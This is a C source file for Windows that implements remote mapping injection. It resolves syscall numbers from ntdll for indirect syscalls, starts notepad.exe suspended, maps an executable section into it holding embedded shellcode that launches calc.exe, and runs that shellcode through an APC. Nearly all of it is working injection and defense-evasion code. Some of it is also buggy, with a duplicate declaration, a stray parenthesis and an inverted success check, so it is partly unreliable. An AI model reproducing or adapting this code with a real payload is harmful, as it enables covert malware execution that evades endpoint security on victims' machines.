#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include "handBag.h"
#include <psapi.h>
#include <wtsapi32.h>
#pragma comment(lib, "Wtsapi32.lib")


DWORD NtOpenProcessSSN;
DWORD NtAllocateVirtualMemorySSN;
DWORD NtProtectVirtualMemorySSN;
DWORD NtProtectVirtualMemorySSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtCloseSSN;
DWORD NtCreateSectionSSN;
DWORD NtMapViewOfSectionSSN;
DWORD RtlCreateUserThreadSSN; 
DWORD NtResumeThreadSSN;
DWORD NtQueueApcThreadSSN;
DWORD NtCreateProcessExSSN;

// addresses of the syscall instructions
UINT_PTR NtCloseSyscall;
UINT_PTR NtOpenProcessSyscall;
UINT_PTR NtCreateThreadExSyscall;
UINT_PTR NtWriteVirtualMemorySyscall;
UINT_PTR NtWaitForSingleObjectSyscall;
UINT_PTR NtAllocateVirtualMemorySyscall;
UINT_PTR NtCreateSectionSyscall;
UINT_PTR NtMapViewOfSectionSyscall;
UINT_PTR RtlCreateUserThreadSyscall;
UINT_PTR NtResumeThreadSyscall;
UINT_PTR NtQueueApcThreadSyscall;
UINT_PTR NtCreateProcessExSyscall;

VOID NtCallResolver(
    IN HMODULE hNTDLL,
    IN LPCSTR NtFunction,
    OUT DWORD* SSN,
    OUT UINT_PTR* Syscall
) {

    UINT_PTR NtFunctionAddress = NULL;
    BYTE SyscallOpcode[2] = { 0x0F, 0x05 };

    info("beginning indirect prelude...");
    info("trying to get the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return NULL;
    }

    okay("got the address of %s! (0x%p)", NtFunction, NtFunctionAddress);
    *SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    *Syscall = NtFunctionAddress + 0x12;

    okay("got the SSN of %s (0x%lx)", NtFunction, *SSN);

    printf("\n------------------------------------\n");
    printf("| %-33s |\n", NtFunction);
    printf("------------------------------------\n");
    printf("| %-10s | %-20s |\n", "Field", "Value");
    printf("------------------------------------\n");
    printf("| %-10s | 0x%-18p |\n", "ADDRESS", (void*)NtFunctionAddress);
    printf("| %-10s | 0x%-18p |\n", "SYSCALL", (void*)*Syscall);
    printf("| %-10s | 0x%-18lx |\n", "SSN", (unsigned long)*SSN);
    printf("------------------------------------\n\n");

}



HMODULE getMod(LPCWSTR modName) {
    HMODULE hModule = NULL;

    hModule = GetModuleHandleW(modName);
    if (hModule == NULL) {
    }
    else {
        okay("got a handle to the module!");
        info("\\___\n       ||%S\n\       ||0x%p\n", modName, hModule);
        return hModule;
    }
}


int FindTarget(const char* procname) {
    int pid = 0;
    WTS_PROCESS_INFOA* proc_info;
    DWORD pi_count = 0;
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count))
        return 0;

    for (int i = 0; i < pi_count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }
    return pid;
}


void Janitor(IN HANDLE hProcThread) {
    info("Time to get clean!...");
    if (hProcThread) {
        NTSTATUS STATUS = NtClose(hProcThread);
        if (STATUS != 0) {
            warn("NtClose Failed to Close handle, error: 0x1%x", STATUS);
            return EXIT_FAILURE;
        }
        okay("Handle closed!");
    }
}



BOOL RemoteMappingInjector( IN PBYTE pPayload, IN SIZE_T sPayloadSize) {


    BOOL bSTATE = TRUE;
    DWORD dwPID;
    HANDLE   hSection = NULL;
    PVOID    pLocalAddress  = NULL,
	     pRemoteAddress = NULL;
    NTSTATUS STATUS = NULL;
    SIZE_T   sViewSize	= NULL;
    LARGE_INTEGER MaximumSize 		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        wprintf(L"ERROR: (%d) Unable to Create Process\n", GetLastError());
    }
    HANDLE				hThread = pi.hThread;
    HANDLE              hProcess = pi.hProcess;

   
    STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (STATUS != STATUS_SUCCESS) {
        info("NtCreateSection Failed With Error : %d \n", STATUS));
        bSTATE = FALSE;
        return;
    }
    STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        info("MapViewOfFile Failed With Error : %d \n", STATUS);
        bSTATE = FALSE; 
        return;
    }

    // Copying the payload to the mapped memory
    memcpy(pLocalAddress, pPayload, sPayloadSize);

    // Maps the payload to a new remote buffer in the target process
   STATUS = NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
   if (STATUS != STATUS_SUCCESS) {
       info("NtMapViewOfSection Failed With Error : %d \n", STATUS);
       bSTATE = FALSE;
       return;
   }
   PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteAddress;
   STATUS = NtQueueApcThread(hThread,(PAPCFUNC)apcRoutine, NULL);
   if (STATUS != STATUS_SUCCESS) {
       info("NtQueueApcThread Failed With Error : %d \n", STATUS);
       bSTATE = FALSE;
       return;
   }
   
   STATUS = NtResumeThread(pi.hThread);
   if (STATUS != STATUS_SUCCESS) {
       info("NtResumeThread Failed With Error : %d \n", STATUS);
       bSTATE = FALSE;
       return;
   }

   Janitor(hThread);
   Janitor(hProcess);

   return bSTATE;
}


void ResolverPrelude() {
    HANDLE hNTDLL;
    hNTDLL = getMod(L"NTDLL");
    NtCallResolver(hNTDLL, "NtOpenProcess", &NtOpenProcessSSN, &NtOpenProcessSyscall);
    NtCallResolver(hNTDLL, "NtAllocateVirtualMemory", &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    NtCallResolver(hNTDLL, "NtWriteVirtualMemory", &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    NtCallResolver(hNTDLL, "NtCreateThreadEx", &NtCreateThreadExSSN, &NtCreateThreadExSyscall);
    NtCallResolver(hNTDLL, "NtWaitForSingleObject", &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
    NtCallResolver(hNTDLL, "NtClose", &NtCloseSSN, &NtCloseSyscall);
    NtCallResolver(hNTDLL, "NtCreateSection", &NtCreateSectionSSN, &NtCreateSectionSyscall);
    NtCallResolver(hNTDLL, "NtMapViewOfSection", &NtMapViewOfSectionSSN, &NtMapViewOfSectionSyscall);
    NtCallResolver(hNTDLL, "RtlCreateUserThread", &RtlCreateUserThreadSSN, &RtlCreateUserThreadSyscall);
    NtCallResolver(hNTDLL, "NtResumeThread", &NtResumeThreadSSN, &NtResumeThreadSyscall);
    NtCallResolver(hNTDLL, "NtQueueApcThread", &NtQueueApcThreadSSN, &NtQueueApcThreadSyscall);
    NtCallResolver(hNTDLL, "NtCreateProcessEx", &NtCreateProcessExSSN, &NtCreateProcessExSyscall);
    
   
}

int main(int argc, char* argv[]) {
   
    ResolverPrelude();

    warn("Indirect Syscalls Obtained, beginning injection!!");

    const UCHAR payload[] = {
        // shellcode to open calc
     0xfc,0x48,0x83,0xe4,0xf0,0xe8,
    0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
    0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
    0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
    0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
    0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
    0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
    0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
    0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
    0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
    0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
    0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
    0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00 };


    if (!RemoteMappingInjector(payload, sizeof(payload)) == 0) {
        warn("Local Mapping Injection injection failed");
        return EXIT_FAILURE;
    };

    
    return 0;
}



